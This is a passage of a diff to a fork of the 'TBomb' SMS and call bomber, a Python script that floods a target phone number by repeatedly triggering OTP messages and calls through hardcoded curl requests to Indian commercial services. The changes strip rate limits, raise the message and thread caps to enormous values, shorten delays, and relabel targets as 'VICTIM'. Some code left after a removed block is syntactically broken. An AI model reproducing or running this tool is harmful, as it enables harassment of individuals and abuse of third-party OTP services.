-H "cookie:PHPSESSID=vnj2hvk8nga4v1m2hvlmvl88r4" -H "cookie:_gid=GA1.2.132668726.1560239715" -H "cookie:_gat=1" -H "cookie:__ta_visit=f5uvpYKu8EVmJAJmFGXMmXGSTiNQSWRS" -H "cookie:_gat_UA-31142855-1=1" -H "cookie:__ta_ping=1" -H "cookie:mage-cache-storage=%7B%7D" -H "cookie:mage-cache-storage-section-invalidation=%7B%7D" -H "cookie:mage-cache-sessid=true" -H "cookie:mage-messages=" -H "cookie:private_content_version=46e6c8611a9b0d06e662da50ca5cf311" -H "cookie:AWSALB=2177QHjXXrFgaem1w0FrBqZ2aoKrMhI+DibolJaee9cVOP4ZSV2LiLC3tks68ud4ERCydxa8kb4klbiI+VEnNQB0rsyins1USgvHcPOUoz2nySN3SC5G/wpAACIq" -H "cookie:section_data_ids=%7B%22cart%22%3A1560239751%7D" -d \'mobile=' + pn + '\' "https://www.apollopharmacy.in/sociallogin/mobile/sendotp/" --output temp.xxx1')
+        while not os.path.exists('temp.xxx1'):
+            time.sleep(0.1)
+        rd = str(open('temp.xxx1', 'rb').read()) + " "
         return rd.find("sent") != -1
     elif lim == 13:
-        cookies = {
-            'Cookie:_ga': 'GA1.2.979928319.1560364071',
-            '_gid': 'GA1.2.666270216.1560364071',
-            'V': '201',
-            '_fbp': 'fb.1.1560364076913.1528349725',
-            'cto_lwid': 'd91bea3a-7610-45aa-8f78-65a0d740fb46',
-            'PushSubscriberStatus': 'DENIED',
-            'peclosed': 'true',
-            'G_ENABLED_IDPS': 'google',
-            'TS018cc593': '01ef61aed0fca110f50d8e3be2c66eb83188f6df8495c0ed2cd772829370fc12690954aad0834f545b57764467dbb66efb05d481a8958aebb273751956ef9eb383a3ba22dd1c94d82021e9d4c40011d4ab9bd97c6f0a74628ac12e8f7bcb663c1608e7288ebd252051cb84def3b021d3bcf643d3f3728ca9c0d9c780d171578ba966774f11ac44864a7f3da59791cb55f2741f23d72f7843efe9306459c00ec2e5f00065729a8573baba42384bb7cf46eb55cf89f72f1dcd5619a26e4ff32c63d06cac8c4bb158da6640bc0b11193134cbf38050ae0db230aa258b1181749fb0373afe041ad1aeffd0c08be7a62010db02cc65edfb1341d2de54cdf475c5dcd84e16c64c50',
-            '_gac_UA-68002030-1': '1.1560366197.Cj0KCQjwxYLoBRCxARIsAEf16-tx5UXrrP9SEhR8dPkTL4a9woEF7Ae-kvSlzKdgq35y31DeK3_uhg8aAkRBEALw_wcB',
-            'cdigiMrkt': 'utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AFri%2C%2012%20Jul%202019%2019%3A03%3A17%20GMT%7C',
-            'ImpressionCookie': '4',
-            'ip': '10.1.10.1',
-            'sessionStatus': 'true|undefined',
-            'FirstPage': 'Thu Jun 13 2019 00:33:53 GMT+0530 (India Standard Time)',
-            '_dc_gtm_UA-68002030-1': '1',
-            'uI': 'johnyaho%40gmail.com',
-            'TS01fe4249': '01ef61aed09c32c6a53ce9e431a6a719c416867f2f3ad713fde2e74175bc248acc7a523f41e9751d032859a159bfff87664b90c3d0a9dfb2392f75876ccbe273b8a8e81d7a8d25047453c17a2905eca7eff26b780c'}
-
-        headers = {
-            'Host': 'www.ajio.com',
-            'Connection': 'keep-alive',
-            'Content-Length': '144',
-            'Accept': 'application/json',
-            'Origin': 'https://www.ajio.com',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36',
-            'content-type': 'application/json',
-            'Referer': 'https://www.ajio.com/signup',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6'}
-
-        data = {"firstName":"SpeedX","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":"0000","requestType":"SENDOTP"}
-
-        response = requests.post('https://www.ajio.com/api/auth/signupSendOTP', headers=headers, cookies=cookies, json=data)
-        rd=response.text
+        rd = ' '
+        try:
+            rd = os.popen(
+                ' curl -s -X POST -H "Host:www.ajio.com" -H "Connection:keep-alive" -H "Content-Length:144" -H "Accept:application/json" -H "Origin:https://www.ajio.com" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Mobile Safari/537.36" -H "content-type:application/json" -H "Referer:https://www.ajio.com/signup" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -H "Cookie:_ga=GA1.2.979928319.1560364071; _gid=GA1.2.666270216.1560364071; V=201; _fbp=fb.1.1560364076913.1528349725; cto_lwid=d91bea3a-7610-45aa-8f78-65a0d740fb46; PushSubscriberStatus=DENIED; peclosed=true; G_ENABLED_IDPS=google; TS018cc593=01ef61aed0fca110f50d8e3be2c66eb83188f6df8495c0ed2cd772829370fc12690954aad0834f545b57764467dbb66efb05d481a8958aebb273751956ef9eb383a3ba22dd1c94d82021e9d4c40011d4ab9bd97c6f0a74628ac12e8f7bcb663c1608e7288ebd252051cb84def3b021d3bcf643d3f3728ca9c0d9c780d171578ba966774f11ac44864a7f3da59791cb55f2741f23d72f7843efe9306459c00ec2e5f00065729a8573baba42384bb7cf46eb55cf89f72f1dcd5619a26e4ff32c63d06cac8c4bb158da6640bc0b11193134cbf38050ae0db230aa258b1181749fb0373afe041ad1aeffd0c08be7a62010db02cc65edfb1341d2de54cdf475c5dcd84e16c64c50; _gac_UA-68002030-1=1.1560366197.Cj0KCQjwxYLoBRCxARIsAEf16-tx5UXrrP9SEhR8dPkTL4a9woEF7Ae-kvSlzKdgq35y31DeK3_uhg8aAkRBEALw_wcB; cdigiMrkt=utm_source%3A%7Cutm_medium%3A%7Cdevice%3Amobile%7Cexpires%3AFri%2C%2012%20Jul%202019%2019%3A03%3A17%20GMT%7C; ImpressionCookie=4; ip=10.1.10.1; sessionStatus=true|undefined; FirstPage=Thu Jun 13 2019 00:33:53 GMT+0530 (India Standard Time); _dc_gtm_UA-68002030-1=1; uI=johnyaho%40gmail.com; TS01fe4249=01ef61aed09c32c6a53ce9e431a6a719c416867f2f3ad713fde2e74175bc248acc7a523f41e9751d032859a159bfff87664b90c3d0a9dfb2392f75876ccbe273b8a8e81d7a8d25047453c17a2905eca7eff26b780c" -d \'{"firstName":"Rox","login":"johnyaho@gmail.com","password":"Rock@5star","genderType":"Male","mobileNumber":"' + pn + '","requestType":"SENDOTP"}\' "https://www.ajio.com/api/auth/signupSendOTP" ').read()
+        except Exception:
+            return True
         if rd.find("\"statusCode\":\"1\"") != -1:
             return True
         else:
             return False
     elif lim == 14:
-
-        headers = {
-            'Host': 'api.cloud.altbalaji.com',
-            'Connection': 'keep-alive',
-            'Accept': 'application/json, text/plain, */*',
-            'Origin': 'https://lite.altbalaji.com',
-            'Save-Data': 'on',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36',
-            'Content-Type': 'application/json;charset=UTF-8',
-            'Referer': 'https://lite.altbalaji.com/subscribe?progress=input',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6',
-        }
-
-
-        data = {"country_code":cc,"phone_number":pn}
-
-        response = requests.post('https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN', headers=headers, json=data)
-        rd=response.text
+        con = '{"country_code":"' + cc + '","phone_number":"' + pn + '"}'
+        os.popen('rm temp.xxx2 > /dev/null 2>&1')
+        os.system('curl -s -X POST -H "Host:api.cloud.altbalaji.com" -H "Connection:keep-alive" -H "Content-Length:' + str(len(con)) +
+                  '" -H "Accept:application/json, text/plain, */*" -H "Origin:https://lite.altbalaji.com" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.89 Mobile Safari/537.36" -H "Content-Type:application/json;charset=UTF-8" -H "Referer:https://lite.altbalaji.com/subscribe?progress=input" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6" -d \'' + con + '\' "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN" -o temp.xxx2')
+        while not os.path.exists('temp.xxx2'):
+            time.sleep(0.1)
+        rd = hashlib.md5(open('temp.xxx2', 'rb').read()).hexdigest()
         return rd == '24f467b24087ff48c96321786d89c69f'
     elif lim == 15:
-
-        cookies = {
-            'Cookie:frontend': 'a27mn3h3irt1rlt6i55s93p9r5',
-            'frontend_cid': '8zqBBzwQTMIt9UKg',
-            '_BEAMER_USER_ID_gADrycBn12870': 'c9fe4f7d-b421-4bad-9cf2-0a4db716dff4',
-            'G_ENABLED_IDPS': 'google',
-        }
-
-        headers = {
-            'Host': 'www.aala.com',
-            'Connection': 'keep-alive',
-            'Accept': 'application/json, text/javascript, */*; q=0.01',
-            'Origin': 'https://www.aala.com',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Save-Data': 'on',
-            'User-Agent': 'Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36',
-            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'Referer': 'https://www.aala.com/',
-            'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5',
-        }
-
-        data = {
-          'email': cc+pn,
-          'firstname': 'SpeedX',
-          'lastname': 'SpeedX'
-        }
-
-        response = requests.post('https://www.aala.com/accustomer/ajax/getOTP', headers=headers, cookies=cookies, json=data)
-        rd=response.text
+        rd = os.popen('curl -s -X POST -H "Host:www.aala.com" -H "Connection:keep-alive" -H "Accept:application/json, text/javascript, */*; q=0.01" -H "Origin:https://www.aala.com" -H "X-Requested-With:XMLHttpRequest" -H "Save-Data:on" -H "User-Agent:Mozilla/5.0 (Linux; Android 8.1.0; vivo 1718) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36" -H "Content-Type:application/x-www-form-urlencoded; charset=UTF-8" -H "Referer:https://www.aala.com/" -H "Accept-Encoding:gzip, deflate, br" -H "Accept-Language:en-IN,en;q=0.9,en-GB;q=0.8,en-US;q=0.7,hi;q=0.6,ar;q=0.5" -H "Cookie:frontend=a27mn3h3irt1rlt6i55s93p9r5; frontend_cid=8zqBBzwQTMIt9UKg; _BEAMER_USER_ID_gADrycBn12870=c9fe4f7d-b421-4bad-9cf2-0a4db716dff4; G_ENABLED_IDPS=google" -d \'email=' + cc + pn + '&firstname=SpeedX&lastname=SpeedX\' "https://www.aala.com/accustomer/ajax/getOTP"').read().strip()
         return rd.find('code:') != -1
     elif lim == 16:
-    
-        data = {
-          'method': 'SMS',
-          'countryCode': 'id',
-          'phoneNumber': cc+pn,
-          'templateID': 'pax_android_production'
-        }
-
-        response = requests.post('https://api.grab.com/grabid/v1/phone/otp', data=data)
+        os.popen('curl -s -X POST -d \'method=SMS&countryCode=id&phoneNumber=' + cc + pn +
+                 '&templateID=pax_android_production\' "https://api.grab.com/grabid/v1/phone/otp"')
         return True
     elif lim == 100:
         rd = os.popen('curl -s -X GET "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/' +
@@ -696,7 +389,7 @@ def remsp(num):
 
 
 def start(target, counter, delay, ch, cc):
-    clr()
+    os.system("clear")
     banner()
     failed = 0
     requested = 0
@@ -727,26 +420,23 @@ def start(target, counter, delay, ch, cc):
                 else:
                     print('\n\n\tSorry Your Country is Not Supported...')
                     print(
-                        '\t\tPlease Send A Mail To ggspeedx29@gmail.com To Let Us Know...')
+                        '\t\tPlease Send A Mail To nandydark@gmail.com To Let Us Know...')
                     input('Press Enter To Exit...')
                     exit()
-        print(random.choice(colors))
         print("==================================================================")
         print("                BOMBING in progress, please wait !!               ")
         print("     Please keep your data connection active during bombing !!    ")
         print("==================================================================")
-        print("             Target Number           : +" + str(cc) + " ", target)
-        print("             Number of Requests Sent : ", requested)
-        print("             Successful Requests     : ", success)
-        print("             Failed Requests         : ", failed)
+        print("             VICTIM Number                 : +" + str(cc) + " ", target)
+        print("             Number of BOMBS               : ", requested)
+        print("             Successful BOMBED             : ", success)
+        print("             We Failed to BOMB             : ", failed)
         print("==================================================================")
-        print("              Use this for fun, not for revenge !!                ")
-        print("              This Bomber Was Created By SpeedX !!                ")
-        print("==================================================================")
+
         try:
             result = getapi(target, api, cc)
         except Exception:
-           result = False
+            result = False
         requested = requested + 1
         if result:
             success = success + 1
@@ -757,27 +447,13 @@ def start(target, counter, delay, ch, cc):
         time.sleep(float(delay))
         if requested % 3 == 0:
             checkinternet()
-    print(W)
     print('\n\nBombing Completed..')
     os.system('rm *.xxx* > /dev/null 2>&1')
     banner()
     exit()
 
 
-def update():
-    stuff_to_update = ['bomber.py', '.version']
-    for fl in stuff_to_update:
-        dat = urllib.request.urlopen(
-            "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/" + fl).read()
-        file = open(fl, 'wb')
-        file.write(dat)
-        file.close()
-    print('\n\t\tUpdated Successfull !!!!')
-    print('\tPlease Run The Script Again...')
-    exit()
-
-
-clr()
+os.system("clear")
 banner()
 try:
     urllib.request.urlopen('https://www.google.com')
@@ -786,24 +462,7 @@ except Exception:
     print("\tPlease Connect To Internet To Continue...\n")
     input('Exiting....\n Press Enter To Continue....')
     exit()
-print('\tChecking For Updates...')
-ver = urllib.request.urlopen(
-    "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.version").read().decode('utf-8')
-verl = ''
-try:
-    verl = open(".version", 'r').read()
-except Exception:
-    pass
-if ver != verl:
-    print('\n\t\tAn Update is Available....')
-    print('\tStarting Update...')
-    update()
-print("Your Version is Up-To-Date")
-print('\n\n\t\t\tStarting TBomb...\n\n')
-try:
-    noti = urllib.request.urlopen(
-        "https://raw.githubusercontent.com/TheSpeedX/TBomb/master/.notify").read().decode('utf-8')
-    noti = noti.upper().strip()
+
     if len(noti) > 10:
         print('\n\n\tNOTIFICATION: ' + noti + '\n\n')
 except Exception:
@@ -836,26 +495,26 @@ try:
 except Exception:
     type = 0
 if type == 1:
-    nm = int(input("Enter Number of Calls To Send(Maximum 15): "))
-    if nm > 15:
+    nm = int(input("Enter Number of Calls To Send(Maximum 9999999999999999): "))
+    if nm > 9999999999999999:
         print("\t\tYou Have Entered " + str(nm) +
-              ".\n\tNormalizing Value To 15")
-        nm = 15
-    dl = float(input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
+              ".\n\tNormalizing Value To 9999999999999999")
+        nm = 9999999999999999
+    dl = float(input("Enter Delay time (in seconds) [Recommended 5 sec ] : "))
 elif type == 0:
     if cc == "91":
         nm = int(input("Enter Number of Messages To Send(0 For Unlimited): "))
         dl = float(
-            input("Enter Delay time (in seconds) [Recommended 2 sec ] : "))
+            input("Enter Delay time (in seconds) [Recommended 1 sec ] : "))
     else:
         nm = int(input("Enter Number of Messages To Send: "))
         dl = float(
-            input("Enter Delay time (in seconds) [Recommended 10 sec ] : "))
+            input("Enter Delay time (in seconds) [Recommended 5 sec ] : "))
 maxlim = 0
 if cc == "91":
-    maxlim = 500
+    maxlim = 99999999999999999999999999999999999999999999999999999999999999999
 else:
-    maxlim = 100
+    maxlim = 99999999999999999999999999999999999999999999999999999999999999999
 if nm > maxlim:
     print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
           str(maxlim) + ' SMS At Once...\n\n')
@@ -864,17 +523,17 @@ if nm > maxlim:
 if not cc.strip() == "91":
     if type == 1:
         print(
-            '\t\tSorry But Call Bombing is Currently Supported Only For Indian Numbers!!!!')
+            "'\t\tYou can't Fuck anyone out of the INDIA!!!!")
         print()
         input('Press Enter To Exit....')
         print('\n\n')
-        banner()
+
         exit()
     cnt = 0
     if pn.strip() == '' or dl <= 0 or nm <= 0 or cc.strip() == '' or cc.find('+') != -1:
         print('\n\n\tSeems Like You Have Given Wrong Inputs...')
         input('\n\t\tPress Enter To Exit...')
-        banner()
+
         exit()
     ch = [0, 14, 15, 16]
     start(pn, nm, dl, ch, str(cc))
@@ -895,12 +554,11 @@ if cbomb:
     start(pn, nm, dl, chl, str(cc))
     exit()
 if nm == 0:
-    nt = int(input("\tNumber Of Threads(10 to 20) : "))
-    if nt <= 0 or nt >= 30:
-        print('\tTBomb Shows Better Result in 10 to 25 Threads\n\t\tStill Continuing....')
+    nt = int(input("\tNumber Of Threads(10 to 50) : "))
+    if nt <= 0 or nt >= 50:
+        print('\tTBomb Shows Better Result in 10 to 50 Threads\n\t\tStill Continuing....')
     print("\n\nPlease Remember That This Is in Experimental Stage And Is Incredibly Fast...")
     t = [None] * nt
-    print(random.choice(colors))
     print("\n\n==================================================================")
     print("                Gearing Up Bomber, please wait !!               ")
     print("     Please keep your data connection active during bombing !!    ")
@@ -910,9 +568,8 @@ if nm == 0:
     print("             Delay               : ", dl)
     print("==================================================================")
     print("              Use this for fun, not for revenge !!                ")
-    print("              This Bomber Was Created By SpeedX !!                ")
+    print("              This Bomber Was edited BY nandydark credits to owner@speedx !! ")
     print("==================================================================")
-    print(W)
     input('\n\nPress CTRL+Z To STOP Bomber... \nPress Enter To Start Bomber...\n')
     os.system('rm *.xxx* > /dev/null 2>&1')
     print("\n\nStarting Bomb....")
@@ -920,14 +577,14 @@ if nm == 0:
         t[i] = threading.Thread(target=infinite, args=(pn, dl, ch, maxlim,))
         t[i].daemon = True
         t[i].start()
-    time.sleep(2)
+    time.sleep(1)
     ci = 0
     while True:
         ci += 1
         l = count_inf
-        print("    Total Number of Requests Sent : ", l)
+        print("	   Total Number of Requests Sent : ", l)
         if int(l) > maxlim:
-            print('\n\n\tSorry Due To Misuse Of This Script We Only Provide ' +
+            print('\n\n\tSorry Due To Misuse Of This Script We Only Provide unlimited' +
                   str(maxlim) + ' SMS At Once...\n\n')
             input('Press Enter To Exit...')
             os.system('rm *xxx* > /dev/null 2>&1')
@@ -938,4 +595,4 @@ if nm == 0:
             checkinternet()
 else:
     start(pn, nm, dl, ch, '91')
-    exit()
+exit()
